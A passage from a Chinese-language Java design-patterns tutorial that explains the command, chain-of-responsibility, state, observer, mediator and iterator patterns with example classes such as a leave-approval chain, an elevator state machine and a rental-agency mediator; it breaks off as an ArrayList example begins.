          try &#123;                if (!started) &#123;                    group.threadStartFailed(this);                &#125;            &#125; catch (Throwable ignore) &#123;            &#125;        &#125;    &#125;        private native void start0();&#125;\n\n会调用一个native方法start0(),调用系统方法，开启一个线程。而接收者是对程序员开放的，可以自己定义接收者。\n/** * jdk Runnable 命令模式 *\t\tTurnOffThread ： 属于具体命令角色 */public class TurnOffThread implements Runnable&#123;     private Receiver receiver;         public TurnOffThread(Receiver receiver) &#123;     \tthis.receiver = receiver;     &#125;     public void run() &#123;     \treceiver.turnOFF();     &#125;&#125;\n\n/** * 测试类 */public class Client &#123;     public static void main(String[] args) &#123;         Receiver receiver = new Receiver();         TurnOffThread turnOffThread = new TurnOffThread(receiver);         Thread thread = new Thread(turnOffThread);         thread.start();     &#125;&#125;\n\n责任链模式概述在现实生活中，常常会出现这样的事例：一个请求有多个对象可以处理，但每个对象的处理条件或权限不同。例如，公司员工请假，可批假的领导有部门负责人、副总经理、总经理等，但每个领导能批准的天数不同，员工必须根据自己要请假的天数去找不同的领导签名，也就是说员工必须记住每个领导的姓名、电话和地址等信息，这增加了难度。这样的例子还有很多，如找领导出差报销、生活中的“击鼓传花”游戏等。\n定义：又名职责链模式，为了避免请求发送者与多个请求处理者耦合在一起，将所有请求的处理者通过前一对象记住其下一个对象的引用而连成一条链；当有请求发生时，可将请求沿着这条链传递，直到有对象处理它为止。\n结构职责链模式主要包含以下角色:\n\n抽象处理者（Handler）角色：定义一个处理请求的接口，包含抽象处理方法和一个后继连接。\n具体处理者（Concrete Handler）角色：实现抽象处理者的处理方法，判断能否处理本次请求，如果可以处理请求则处理，否则将该请求转给它的后继者。\n客户类（Client）角色：创建处理链，并向链头的具体处理者对象提交请求，它不关心处理细节和请求的传递过程。\n\n案例实现现需要开发一个请假流程控制系统。请假一天以下的假只需要小组长同意即可；请假1天到3天的假还需要部门经理同意；请求3天到7天还需要总经理同意才行。\n类图如下：\n\n代码如下：\n//请假条public class LeaveRequest &#123;    private String name;//姓名    private int num;//请假天数    private String content;//请假内容    public LeaveRequest(String name, int num, String content) &#123;        this.name = name;        this.num = num;        this.content = content;    &#125;    public String getName() &#123;        return name;    &#125;    public int getNum() &#123;        return num;    &#125;    public String getContent() &#123;        return content;    &#125;&#125;//处理者抽象类public abstract class Handler &#123;    protected final static int NUM_ONE = 1;    protected final static int NUM_THREE = 3;    protected final static int NUM_SEVEN = 7;    //该领导处理的请假天数区间    private int numStart;    private int numEnd;    //领导上面还有领导    private Handler nextHandler;    //设置请假天数范围 上不封顶    public Handler(int numStart) &#123;        this.numStart = numStart;    &#125;    //设置请假天数范围    public Handler(int numStart, int numEnd) &#123;        this.numStart = numStart;        this.numEnd = numEnd;    &#125;    //设置上级领导    public void setNextHandler(Handler nextHandler)&#123;        this.nextHandler = nextHandler;    &#125;    //提交请假条    public final void submit(LeaveRequest leave)&#123;        if(0 == this.numStart)&#123;            return;        &#125;        //如果请假天数达到该领导者的处理要求        if(leave.getNum() &gt;= this.numStart)&#123;            this.handleLeave(leave);            //如果还有上级 并且请假天数超过了当前领导的处理范围            if(null != this.nextHandler &amp;&amp; leave.getNum() &gt; numEnd)&#123;                this.nextHandler.submit(leave);//继续提交            &#125; else &#123;                System.out.println(&quot;流程结束&quot;);            &#125;        &#125;    &#125;    //各级领导处理请假条方法    protected abstract void handleLeave(LeaveRequest leave);&#125;//小组长public class GroupLeader extends Handler &#123;    public GroupLeader() &#123;        //小组长处理1-3天的请假        super(Handler.NUM_ONE, Handler.NUM_THREE);    &#125;    @Override    protected void handleLeave(LeaveRequest leave) &#123;        System.out.println(leave.getName() + &quot;请假&quot; + leave.getNum() + &quot;天,&quot; + leave.getContent() + &quot;。&quot;);        System.out.println(&quot;小组长审批：同意。&quot;);    &#125;&#125;//部门经理public class Manager extends Handler &#123;    public Manager() &#123;        //部门经理处理3-7天的请假        super(Handler.NUM_THREE, Handler.NUM_SEVEN);    &#125;    @Override    protected void handleLeave(LeaveRequest leave) &#123;        System.out.println(leave.getName() + &quot;请假&quot; + leave.getNum() + &quot;天,&quot; + leave.getContent() + &quot;。&quot;);        System.out.println(&quot;部门经理审批：同意。&quot;);    &#125;&#125;//总经理public class GeneralManager extends Handler &#123;    public GeneralManager() &#123;        //部门经理处理7天以上的请假        super(Handler.NUM_SEVEN);    &#125;    @Override    protected void handleLeave(LeaveRequest leave) &#123;        System.out.println(leave.getName() + &quot;请假&quot; + leave.getNum() + &quot;天,&quot; + leave.getContent() + &quot;。&quot;);        System.out.println(&quot;总经理审批：同意。&quot;);    &#125;&#125;//测试类public class Client &#123;    public static void main(String[] args) &#123;        //请假条来一张        LeaveRequest leave = new LeaveRequest(&quot;小花&quot;,5,&quot;身体不适&quot;);        //各位领导        GroupLeader groupLeader = new GroupLeader();        Manager manager = new Manager();        GeneralManager generalManager = new GeneralManager();        groupLeader.setNextHandler(manager);//小组长的领导是部门经理        manager.setNextHandler(generalManager);//部门经理的领导是总经理        //之所以在这里设置上级领导，是因为可以根据实际需求来更改设置，如果实战中上级领导人都是固定的，则可以移到领导实现类中。        //提交申请        groupLeader.submit(leave);    &#125;&#125;\n\n优缺点\n优点：\n\n降低了对象之间的耦合度该模式降低了请求发送者和接收者的耦合度。\n增强了系统的可扩展性可以根据需要增加新的请求处理类，满足开闭原则。\n增强了给对象指派职责的灵活性当工作流程发生变化，可以动态地改变链内的成员或者修改它们的次序，也可动态地新增或者删除责任。\n责任链简化了对象之间的连接一个对象只需保持一个指向其后继者的引用，不需保持其他所有处理者的引用，这避免了使用众多的 if 或者 if···else 语句。\n责任分担每个类只需要处理自己该处理的工作，不能处理的传递给下一个对象完成，明确各类的责任范围，符合类的单一职责原则。\n\n\n缺点：\n\n不能保证每个请求一定被处理。由于一个请求没有明确的接收者，所以不能保证它一定会被处理，该请求可能一直传到链的末端都得不到处理。\n对比较长的职责链，请求的处理可能涉及多个处理对象，系统性能将受到一定影响。\n职责链建立的合理性要靠客户端来保证，增加了客户端的复杂性，可能会由于职责链的错误设置而导致系统出错，如可能会造成循环调用。\n\n\n\nJavaWeb中的应用（FilterChain）在javaWeb应用开发中，FilterChain是职责链（过滤器）模式的典型应用，以下是Filter的模拟实现分析:\n模拟web请求Request以及web响应Response\npublic interface Request&#123;&#125;public interface Response&#123;&#125;\n\n模拟web过滤器Filter\npublic interface Filter &#123;    public void doFilter(Request req,Response res,FilterChain c);&#125;\n\n模拟实现具体过滤器\npublic class FirstFilter implements Filter &#123;   @Override   public void doFilter(Request request, Response response, FilterChain chain) &#123;       System.out.println(&quot;过滤器1 前置处理&quot;);       // 先执行所有request再倒序执行所有response       chain.doFilter(request, response);       System.out.println(&quot;过滤器1 后置处理&quot;);   &#125;&#125;public class SecondFilter  implements Filter &#123;   @Override   public void doFilter(Request request, Response response, FilterChain chain) &#123;       System.out.println(&quot;过滤器2 前置处理&quot;);          // 先执行所有request再倒序执行所有response       chain.doFilter(request, response);          System.out.println(&quot;过滤器2 后置处理&quot;);   &#125;&#125;\n\n模拟实现过滤器链FilterChain\npublic class FilterChain &#123;      private List&lt;Filter&gt; filters = new ArrayList&lt;Filter&gt;();      private int index = 0;      // 链式调用   public FilterChain addFilter(Filter filter) &#123;       this.filters.add(filter);       return this;   &#125;      public void doFilter(Request request, Response response) &#123;       if (index == filters.size()) &#123;           return;       &#125;       Filter filter = filters.get(index);       index++;       filter.doFilter(request, response, this);   &#125;&#125;\n\n测试类\npublic class Client &#123;   public static void main(String[] args) &#123;       Request  req = null;       Response res = null;       FilterChain filterChain = new FilterChain();       filterChain.addFilter(new FirstFilter()).addFilter(new SecondFilter());       filterChain.doFilter(req,res);   &#125;&#125;\n\n状态模式概述例：通过按钮来控制一个电梯的状态，一个电梯有开门状态，关门状态，停止状态，运行状态。每一种状态改变，都有可能要根据其他状态来更新处理。例如，如果电梯门现在处于运行时状态，就不能进行开门操作，而如果电梯门是停止状态，就可以执行开门操作。\n类图如下：\n\n代码如下：\npublic interface ILift &#123;    //电梯的4个状态    //开门状态    public final static int OPENING_STATE = 1;    //关门状态    public final static int CLOSING_STATE = 2;    //运行状态    public final static int RUNNING_STATE = 3;    //停止状态    public final static int STOPPING_STATE = 4;    //设置电梯的状态    public void setState(int state);    //电梯的动作    public void open();    public void close();    public void run();    public void stop();&#125;public class Lift implements ILift &#123;    private int state;    @Override    public void setState(int state) &#123;        this.state = state;    &#125;    //执行关门动作    @Override    public void close() &#123;        switch (this.state) &#123;            case OPENING_STATE:                System.out.println(&quot;电梯关门了。。。&quot;);//只有开门状态可以关闭电梯门，可以对应电梯状态表来看                this.setState(CLOSING_STATE);//关门之后电梯就是关闭状态了                break;            case CLOSING_STATE:                //do nothing //已经是关门状态，不能关门                break;            case RUNNING_STATE:                //do nothing //运行时电梯门是关着的，不能关门                break;            case STOPPING_STATE:                //do nothing //停止时电梯也是关着的，不能关门                break;        &#125;    &#125;    //执行开门动作    @Override    public void open() &#123;        switch (this.state) &#123;            case OPENING_STATE://门已经开了，不能再开门了                //do nothing                break;            case CLOSING_STATE://关门状态，门打开:                System.out.println(&quot;电梯门打开了。。。&quot;);                this.setState(OPENING_STATE);                break;            case RUNNING_STATE:                //do nothing 运行时电梯不能开门                break;            case STOPPING_STATE:                System.out.println(&quot;电梯门开了。。。&quot;);//电梯停了，可以开门了                this.setState(OPENING_STATE);                break;        &#125;    &#125;    //执行运行动作    @Override    public void run() &#123;        switch (this.state) &#123;            case OPENING_STATE://电梯不能开着门就走                //do nothing                break;            case CLOSING_STATE://门关了，可以运行了                System.out.println(&quot;电梯开始运行了。。。&quot;);                this.setState(RUNNING_STATE);//现在是运行状态                break;            case RUNNING_STATE:                //do nothing 已经是运行状态了                break;            case STOPPING_STATE:                System.out.println(&quot;电梯开始运行了。。。&quot;);                this.setState(RUNNING_STATE);                break;        &#125;    &#125;    //执行停止动作    @Override    public void stop() &#123;        switch (this.state) &#123;            case OPENING_STATE: //开门的电梯已经是是停止的了(正常情况下)                //do nothing                break;            case CLOSING_STATE://关门时才可以停止                System.out.println(&quot;电梯停止了。。。&quot;);                this.setState(STOPPING_STATE);                break;            case RUNNING_STATE://运行时当然可以停止了                System.out.println(&quot;电梯停止了。。。&quot;);                this.setState(STOPPING_STATE);                break;            case STOPPING_STATE:                //do nothing                break;        &#125;    &#125;&#125;public class Client &#123;    public static void main(String[] args) &#123;        Lift lift = new Lift();        lift.setState(ILift.STOPPING_STATE);//电梯是停止的        lift.open();//开门        lift.close();//关门        lift.run();//运行        lift.stop();//停止    &#125;&#125;\n\n问题分析：\n\n使用了大量的switch…case这样的判断（if…else也是一样)，使程序的可阅读性变差。\n扩展性很差。如果新加了断电的状态，需要修改上面判断逻辑\n\n定义：对有状态的对象，把复杂的“判断逻辑”提取到不同的状态对象中，允许状态对象在其内部状态发生改变时改变其行为。\n结构状态模式包含以下主要角色。\n\n环境（Context）角色：也称为上下文，它定义了客户程序需要的接口，维护一个当前状态，并将与状态相关的操作委托给当前状态对象来处理。\n抽象状态（State）角色：定义一个接口，用以封装环境对象中的特定状态所对应的行为。\n具体状态（Concrete  State）角色：实现抽象状态所对应的行为。\n\n案例实现对上述电梯的案例使用状态模式进行改进。类图如下：\n\n代码如下：\n//抽象状态类public abstract class LiftState &#123;    //定义一个环境角色，也就是封装状态的变化引起的功能变化    protected Context context;    public void setContext(Context context) &#123;        this.context = context;    &#125;    //电梯开门动作    public abstract void open();    //电梯关门动作    public abstract void close();    //电梯运行动作    public abstract void run();    //电梯停止动作    public abstract void stop();&#125;//开启状态public class OpenningState extends LiftState &#123;    //开启当然可以关闭了，我就想测试一下电梯门开关功能    @Override    public void open() &#123;        System.out.println(&quot;电梯门开启...&quot;);    &#125;    @Override    public void close() &#123;        //状态修改        super.context.setLiftState(Context.closingState);        //动作委托为CloseState来执行，也就是委托给了ClosingState子类执行这个动作        super.context.getLiftState().close();    &#125;    //电梯门不能开着就跑，这里什么也不做    @Override    public void run() &#123;        //do nothing    &#125;    //开门状态已经是停止的了    @Override    public void stop() &#123;        //do nothing    &#125;&#125;//运行状态public class RunningState extends LiftState &#123;    //运行的时候开电梯门？你疯了！电梯不会给你开的    @Override    public void open() &#123;        //do nothing    &#125;    //电梯门关闭？这是肯定了    @Override    public void close() &#123;//虽然可以关门，但这个动作不归我执行        //do nothing    &#125;    //这是在运行状态下要实现的方法    @Override    public void run() &#123;        System.out.println(&quot;电梯正在运行...&quot;);    &#125;    //这个事绝对是合理的，光运行不停止还有谁敢做这个电梯？！估计只有上帝了    @Override    public void stop() &#123;        super.context.setLiftState(Context.stoppingState);        super.context.stop();    &#125;&#125;//停止状态public class StoppingState extends LiftState &#123;    //停止状态，开门，那是要的！    @Override    public void open() &#123;        //状态修改        super.context.setLiftState(Context.openningState);        //动作委托为CloseState来执行，也就是委托给了ClosingState子类执行这个动作        super.context.getLiftState().open();    &#125;    @Override    public void close() &#123;//虽然可以关门，但这个动作不归我执行        //状态修改        super.context.setLiftState(Context.closingState);        //动作委托为CloseState来执行，也就是委托给了ClosingState子类执行这个动作        super.context.getLiftState().close();    &#125;    //停止状态再跑起来，正常的很    @Override    public void run() &#123;        //状态修改        super.context.setLiftState(Context.runningState);        //动作委托为CloseState来执行，也就是委托给了ClosingState子类执行这个动作        super.context.getLiftState().run();    &#125;    //停止状态是怎么发生的呢？当然是停止方法执行了    @Override    public void stop() &#123;        System.out.println(&quot;电梯停止了...&quot;);    &#125;&#125;//关闭状态public class ClosingState extends LiftState &#123;    @Override    //电梯门关闭，这是关闭状态要实现的动作    public void close() &#123;        System.out.println(&quot;电梯门关闭...&quot;);    &#125;    //电梯门关了再打开，逗你玩呢，那这个允许呀    @Override    public void open() &#123;        super.context.setLiftState(Context.openningState);        super.context.open();    &#125;    //电梯门关了就跑，这是再正常不过了    @Override    public void run() &#123;        super.context.setLiftState(Context.runningState);        super.context.run();    &#125;    //电梯门关着，我就不按楼层    @Override    public void stop() &#123;        super.context.setLiftState(Context.stoppingState);        super.context.stop();    &#125;&#125;//环境角色public class Context &#123;    //定义出所有的电梯状态    public final static OpenningState openningState = new OpenningState();//开门状态，这时候电梯只能关闭    public final static ClosingState closingState = new ClosingState();//关闭状态，这时候电梯可以运行、停止和开门    public final static RunningState runningState = new RunningState();//运行状态，这时候电梯只能停止    public final static StoppingState stoppingState = new StoppingState();//停止状态，这时候电梯可以开门、运行    //定义一个当前电梯状态    private LiftState liftState;    public LiftState getLiftState() &#123;        return this.liftState;    &#125;    public void setLiftState(LiftState liftState) &#123;        //当前环境改变        this.liftState = liftState;        //把当前的环境通知到各个实现类中        this.liftState.setContext(this);    &#125;    public void open() &#123;        this.liftState.open();    &#125;    public void close() &#123;        this.liftState.close();    &#125;    public void run() &#123;        this.liftState.run();    &#125;    public void stop() &#123;        this.liftState.stop();    &#125;&#125;//测试类public class Client &#123;    public static void main(String[] args) &#123;        Context context = new Context();        context.setLiftState(new ClosingState());        context.open();        context.close();        context.run();        context.stop();    &#125;&#125;\n\n优缺点\n优点：\n\n将所有与某个状态有关的行为放到一个类中，并且可以方便地增加新的状态，只需要改变对象状态即可改变对象的行为。\n允许状态转换逻辑与状态对象合成一体，而不是某一个巨大的条件语句块。\n\n\n缺点：\n\n状态模式的使用必然会增加系统类和对象的个数。\n状态模式的结构与实现都较为复杂，如果使用不当将导致程序结构和代码的混乱。\n状态模式对”开闭原则”的支持并不太好。\n\n\n\n使用场景\n当一个对象的行为取决于它的状态，并且它必须在运行时根据状态改变它的行为时，就可以考虑使用状态模式。\n一个操作中含有庞大的分支结构，并且这些分支决定于对象的状态时。\n\n观察者模式概述定义：又被称为发布-订阅（Publish&#x2F;Subscribe）模式，它定义了一种一对多的依赖关系，让多个观察者对象同时监听某一个主题对象。这个主题对象在状态变化时，会通知所有的观察者对象，使他们能够自动更新自己。\n结构在观察者模式中有如下角色：\n\nSubject：抽象主题（抽象被观察者），抽象主题角色把所有观察者对象保存在一个集合里，每个主题都可以有任意数量的观察者，抽象主题提供一个接口，可以增加和删除观察者对象。\nConcreteSubject：具体主题（具体被观察者），该角色将有关状态存入具体观察者对象，在具体主题的内部状态发生改变时，给所有注册过的观察者发送通知。\nObserver：抽象观察者，是观察者的抽象类，它定义了一个更新接口，使得在得到主题更改通知时更新自己。\nConcrereObserver：具体观察者，实现抽象观察者定义的更新接口，以便在得到主题更改通知时更新自身的状态。\n\n案例实现例：微信公众号在使用微信公众号时，大家都会有这样的体验，当你关注的公众号中有新内容更新的话，它就会推送给关注公众号的微信用户端。使用观察者模式来模拟这样的场景，微信用户就是观察者，微信公众号是被观察者，有多个的微信用户关注了程序猿这个公众号。\n类图如下：\n7\n代码如下：\n定义抽象观察者类，里面定义一个更新的方法\npublic interface Observer &#123;    void update(String message);&#125;\n\n定义具体观察者类，微信用户是观察者，里面实现了更新的方法\npublic class WeixinUser implements Observer &#123;    // 微信用户名    private String name;    public WeixinUser(String name) &#123;        this.name = name;    &#125;    @Override    public void update(String message) &#123;        System.out.println(name + &quot;-&quot; + message);    &#125;&#125;\n\n定义抽象主题类，提供了attach、detach、notify三个方法\npublic interface Subject &#123;    //增加订阅者    public void attach(Observer observer);    //删除订阅者    public void detach(Observer observer);        //通知订阅者更新消息    public void notify(String message);&#125;\n\n微信公众号是具体主题（具体被观察者），里面存储了订阅该公众号的微信用户，并实现了抽象主题中的方法\npublic class SubscriptionSubject implements Subject &#123;    //储存订阅公众号的微信用户    private List&lt;Observer&gt; weixinUserlist = new ArrayList&lt;Observer&gt;();    @Override    public void attach(Observer observer) &#123;        weixinUserlist.add(observer);    &#125;    @Override    public void detach(Observer observer) &#123;        weixinUserlist.remove(observer);    &#125;    @Override    public void notify(String message) &#123;        for (Observer observer : weixinUserlist) &#123;            observer.update(message);        &#125;    &#125;&#125;\n\n客户端程序\npublic class Client &#123;    public static void main(String[] args) &#123;        SubscriptionSubject mSubscriptionSubject=new SubscriptionSubject();        //创建微信用户        WeixinUser user1=new WeixinUser(&quot;孙悟空&quot;);        WeixinUser user2=new WeixinUser(&quot;猪悟能&quot;);        WeixinUser user3=new WeixinUser(&quot;沙悟净&quot;);        //订阅公众号        mSubscriptionSubject.attach(user1);        mSubscriptionSubject.attach(user2);        mSubscriptionSubject.attach(user3);        //公众号更新发出消息给订阅的微信用户        mSubscriptionSubject.notify(&quot;传智黑马的专栏更新了&quot;);    &#125;&#125;\n\n优缺点\n优点：\n\n降低了目标与观察者之间的耦合关系，两者之间是抽象耦合关系。\n被观察者发送通知，所有注册的观察者都会收到信息【可以实现广播机制】\n\n\n缺点：\n\n如果观察者非常多的话，那么所有的观察者收到被观察者发送的通知会耗时\n如果被观察者有循环依赖的话，那么被观察者发送通知会使观察者循环调用，会导致系统崩溃\n\n\n\n使用场景\n对象间存在一对多关系，一个对象的状态发生改变会影响其他对象。\n当一个抽象模型有两个方面，其中一个方面依赖于另一方面时。\n\nJDK中提供的实现在 Java 中，通过 java.util.Observable 类和 java.util.Observer 接口定义了观察者模式，只要实现它们的子类就可以编写观察者模式实例。\n\nObservable类Observable 类是抽象目标类（被观察者），它有一个 Vector 集合成员变量，用于保存所有要通知的观察者对象，下面来介绍它最重要的 3 个方法。\n\nvoid addObserver(Observer o) 方法：用于将新的观察者对象添加到集合中。\nvoid notifyObservers(Object arg) 方法：调用集合中的所有观察者对象的 update方法，通知它们数据发生改变。通常越晚加入集合的观察者越先得到通知。\nvoid setChange() 方法：用来设置一个 boolean 类型的内部标志，注明目标对象发生了变化。当它为true时，notifyObservers() 才会通知观察者。\n\n\nObserver 接口Observer 接口是抽象观察者，它监视目标对象的变化，当目标对象发生变化时，观察者得到通知，并调用 update 方法，进行相应的工作。\n\n\n例：警察抓小偷警察抓小偷也可以使用观察者模式来实现，警察是观察者，小偷是被观察者。代码如下：小偷是一个被观察者，所以需要继承Observable类\npublic class Thief extends Observable &#123;    private String name;    public Thief(String name) &#123;        this.name = name;    &#125;        public void setName(String name) &#123;        this.name = name;    &#125;    public String getName() &#123;        return name;    &#125;    public void steal() &#123;        System.out.println(&quot;小偷：我偷东西了，有没有人来抓我！！！&quot;);        super.setChanged(); //changed  = true        super.notifyObservers();    &#125;&#125;\n\n警察是一个观察者，所以需要让其实现Observer接口\npublic class Policemen implements Observer &#123;    private String name;    public Policemen(String name) &#123;        this.name = name;    &#125;    public void setName(String name) &#123;        this.name = name;    &#125;    public String getName() &#123;        return name;    &#125;    @Override    public void update(Observable o, Object arg) &#123;        System.out.println(&quot;警察：&quot; + ((Thief) o).getName() + &quot;，我已经盯你很久了，你可以保持沉默，但你所说的将成为呈堂证供！！！&quot;);    &#125;&#125;\n\n客户端代码\npublic class Client &#123;    public static void main(String[] args) &#123;        //创建小偷对象        Thief t = new Thief(&quot;隔壁老王&quot;);        //创建警察对象        Policemen p = new Policemen(&quot;小李&quot;);        //让警察盯着小偷        t.addObserver(p);        //小偷偷东西        t.steal();    &#125;&#125;\n\n中介者模式概述一般来说，同事类之间的关系是比较复杂的，多个同事类之间互相关联时，他们之间的关系会呈现为复杂的网状结构，这是一种过度耦合的架构，即不利于类的复用，也不稳定。例如在下左图中，有六个同事类对象，假如对象1发生变化，那么将会有4个对象受到影响。如果对象2发生变化，那么将会有5个对象受到影响。也就是说，同事类之间直接关联的设计是不好的。\n如果引入中介者模式，那么同事类之间的关系将变为星型结构，从下右图中可以看到，任何一个类的变动，只会影响的类本身，以及中介者，这样就减小了系统的耦合。一个好的设计，必定不会把所有的对象关系处理逻辑封装在本类中，而是使用一个专门的类来管理那些不属于自己的行为。\n\n定义：又叫调停模式，定义一个中介角色来封装一系列对象之间的交互，使原有对象之间的耦合松散，且可以独立地改变它们之间的交互。\n结构中介者模式包含以下主要角色：\n\n抽象中介者（Mediator）角色：它是中介者的接口，提供了同事对象注册与转发同事对象信息的抽象方法。\n具体中介者（ConcreteMediator）角色：实现中介者接口，定义一个 List 来管理同事对象，协调各个同事角色之间的交互关系，因此它依赖于同事角色。\n抽象同事类（Colleague）角色：定义同事类的接口，保存中介者对象，提供同事对象交互的抽象方法，实现所有相互影响的同事类的公共功能。\n具体同事类（Concrete Colleague）角色：是抽象同事类的实现者，当需要与其他同事对象交互时，由中介者对象负责后续的交互。\n\n案例实现例：租房现在租房基本都是通过房屋中介，房主将房屋托管给房屋中介，而租房者从房屋中介获取房屋信息。房屋中介充当租房者与房屋所有者之间的中介者。\n类图如下：\n代码如下：\n//抽象中介者public abstract class Mediator &#123;    //申明一个联络方法    public abstract void constact(String message,Person person);&#125;//抽象同事类public abstract class Person &#123;    protected String name;    protected Mediator mediator;    public Person(String name,Mediator mediator)&#123;        this.name = name;        this.mediator = mediator;    &#125;&#125;//具体同事类 房屋拥有者public class HouseOwner extends Person &#123;    public HouseOwner(String name, Mediator mediator) &#123;        super(name, mediator);    &#125;    //与中介者联系    public void constact(String message)&#123;        mediator.constact(message, this);    &#125;    //获取信息    public void getMessage(String message)&#123;        System.out.println(&quot;房主&quot; + name +&quot;获取到的信息：&quot; + message);    &#125;&#125;//具体同事类 承租人public class Tenant extends Person &#123;    public Tenant(String name, Mediator mediator) &#123;        super(name, mediator);    &#125;    //与中介者联系    public void constact(String message)&#123;        mediator.constact(message, this);    &#125;    //获取信息    public void getMessage(String message)&#123;        System.out.println(&quot;租房者&quot; + name +&quot;获取到的信息：&quot; + message);    &#125;&#125;//中介机构public class MediatorStructure extends Mediator &#123;    //首先中介结构必须知道所有房主和租房者的信息    private HouseOwner houseOwner;    private Tenant tenant;    public HouseOwner getHouseOwner() &#123;        return houseOwner;    &#125;    public void setHouseOwner(HouseOwner houseOwner) &#123;        this.houseOwner = houseOwner;    &#125;    public Tenant getTenant() &#123;        return tenant;    &#125;    public void setTenant(Tenant tenant) &#123;        this.tenant = tenant;    &#125;    public void constact(String message, Person person) &#123;        if (person == houseOwner) &#123;          //如果是房主，则租房者获得信息            tenant.getMessage(message);        &#125; else &#123;       //反正则是房主获得信息            houseOwner.getMessage(message);        &#125;    &#125;&#125;//测试类public class Client &#123;    public static void main(String[] args) &#123;        //一个房主、一个租房者、一个中介机构        MediatorStructure mediator = new MediatorStructure();        //房主和租房者只需要知道中介机构即可        HouseOwner houseOwner = new HouseOwner(&quot;张三&quot;, mediator);        Tenant tenant = new Tenant(&quot;李四&quot;, mediator);        //中介结构要知道房主和租房者        mediator.setHouseOwner(houseOwner);        mediator.setTenant(tenant);        tenant.constact(&quot;需要租三室的房子&quot;);        houseOwner.constact(&quot;我这有三室的房子，你需要租吗？&quot;);    &#125;&#125;\n\n优缺点\n优点：\n\n松散耦合中介者模式通过把多个同事对象之间的交互封装到中介者对象里面，从而使得同事对象之间松散耦合，基本上可以做到互补依赖。这样一来，同事对象就可以独立地变化和复用，而不再像以前那样“牵一处而动全身”了。\n集中控制交互 多个同事对象的交互，被封装在中介者对象里面集中管理，使得这些交互行为发生变化的时候，只需要修改中介者对象就可以了，当然如果是已经做好的系统，那么就扩展中介者对象，而各个同事类不需要做修改。\n一对多关联转变为一对一的关联 没有使用中介者模式的时候，同事对象之间的关系通常是一对多的，引入中介者对象以后，中介者对象和同事对象的关系通常变成双向的一对一，这会让对象的关系更容易理解和实现。\n\n\n缺点：当同事类太多时，中介者的职责将很大，它会变得复杂而庞大，以至于系统难以维护。\n\n\n使用场景\n系统中对象之间存在复杂的引用关系，系统结构混乱且难以理解。\n当想创建一个运行于多个类之间的对象，又不想生成新的子类时。\n\n迭代器模式概述定义：提供一个对象来顺序访问聚合对象中的一系列数据，而不暴露聚合对象的内部表示。\n结构迭代器模式主要包含以下角色：\n\n抽象聚合（Aggregate）角色：定义存储、添加、删除聚合元素以及创建迭代器对象的接口。\n具体聚合（ConcreteAggregate）角色：实现抽象聚合类，返回一个具体迭代器的实例。\n抽象迭代器（Iterator）角色：定义访问和遍历聚合元素的接口，通常包含 hasNext()、next() 等方法。\n具体迭代器（Concretelterator）角色：实现抽象迭代器接口中所定义的方法，完成对聚合对象的遍历，记录遍历的当前位置。\n\n案例实现例：定义一个可以存储学生对象的容器对象，将遍历该容器的功能交由迭代器实现，涉及到的类如下：\n\n代码如下：\n定义被遍历的对象\npublic class Student &#123;    private String name;    private String number;    @Override    public String toString() &#123;        return &quot;Student&#123;&quot; +                &quot;name=&#x27;&quot; + name + &#x27;\\&#x27;&#x27; +                &quot;, number=&#x27;&quot; + number + &#x27;\\&#x27;&#x27; +                &#x27;&#125;&#x27;;    &#125;    public String getName() &#123;        return name;    &#125;    public void setName(String name) &#123;        this.name = name;    &#125;    public String getNumber() &#123;        return number;    &#125;    public void setNumber(String number) &#123;        this.number = number;    &#125;   public Student(String name, String number) &#123;      this.name = name;      this.number = number;   &#125;&#125;\n\n定义迭代器接口，声明hasNext、next方法\npublic interface StudentIterator &#123;    boolean hasNext();    Student next();&#125;\n\n定义具体的迭代器类，重写所有的抽象方法\npublic class StudentIteratorImpl implements StudentIterator &#123;    private List&lt;Student&gt; list;    private int position = 0;    public StudentIteratorImpl(List&lt;Student&gt; list) &#123;        this.list = list;    &#125;    @Override    public boolean hasNext() &#123;        return position &lt; list.size();    &#125;    @Override    public Student next() &#123;        Student currentStudent = list.get(position);        position ++;        return currentStudent;    &#125;&#125;\n\n定义抽象容器类，包含添加元素，删除元素，获取迭代器对象的方法\npublic interface StudentAggregate &#123;    void addStudent(Student student);    void removeStudent(Student student);    StudentIterator getStudentIterator();&#125;\n\n定义具体的容器类，重写所有的方法\npublic class StudentAggregateImpl implements StudentAggregate &#123;    private List&lt;Student&gt; list = new ArrayList&lt;Student&gt;();  // 学生列表    @Override    public void addStudent(Student student) &#123;        this.list.add(student);    &#125;    @Override    public void removeStudent(Student student) &#123;        this.list.remove(student);    &#125;    @Override    public StudentIterator getStudentIterator() &#123;        return new StudentIteratorImpl(list);    &#125;&#125;\n\n测试类\npublic class Client &#123;    public static void main(String[] args) &#123;        // 创建集合对象        StudentAggregate aggregate = new StudentAggregateImpl();        // 添加元素        aggregate.addStudent(new Student(&quot;张三&quot;,&quot;001&quot;));        aggregate.addStudent(new Student(&quot;李四&quot;,&quot;002&quot;));        aggregate.addStudent(new Student(&quot;王五&quot;,&quot;003&quot;));        aggregate.addStudent(new Student(&quot;赵六&quot;,&quot;004&quot;));        // 获取迭代器对象        StudentIterator iterator = aggregate.getStudentIterator();        // 遍历        while (iterator.hasNext())&#123;            Student student = iterator.next();            System.out.println(student);        &#125;    &#125;&#125;\n\n优缺点\n优点：\n\n它支持以不同的方式遍历一个聚合对象，在同一个聚合对象上可以定义多种遍历方式。在迭代器模式中只需要用一个不同的迭代器来替换原有迭代器即可改变遍历算法，我们也可以自己定义迭代器的子类以支持新的遍历方式。\n迭代器简化了聚合类。由于引入了迭代器，在原有的聚合对象中不需要再自行提供数据遍历等方法，这样可以简化聚合类的设计。\n在迭代器模式中，由于引入了抽象层，增加新的聚合类和迭代器类都很方便，无须修改原有代码，满足 “开闭原则” 的要求。\n\n\n缺点：增加了类的个数，这在一定程度上增加了系统的复杂性。\n\n\n使用场景\n当需要为聚合对象提供多种遍历方式时。\n当需要为遍历不同的聚合结构提供一个统一的接口时。\n当访问一个聚合对象的内容而无须暴露其内部细节的表示时。\n\nJDK中的应用（很多）迭代器模式在JAVA的很多集合类中被广泛应用，接下来看看JAVA源码中是如何使用迭代器模式的。\nList&lt;String&gt; list = new ArrayList&lt;&gt;();Iterator&lt;String&gt; iterator = list.iterator(); //list.iterator()方法返回的肯定是Iterator接口的子实现类对象while (iterator.hasNext()) &#123;    System.out.println(iterator.next());&#125;\n\n单列集合都使用到了迭代器，以ArrayList举例来说明\n\nList：抽象聚合类\nArrayList：具体的聚合类\nIterator：抽象迭代器\nlist.iterator()：返回的是实现了 Iterator 接口的具体迭代器对象\n\n具体的来看看 ArrayList的代码实现\npublic class 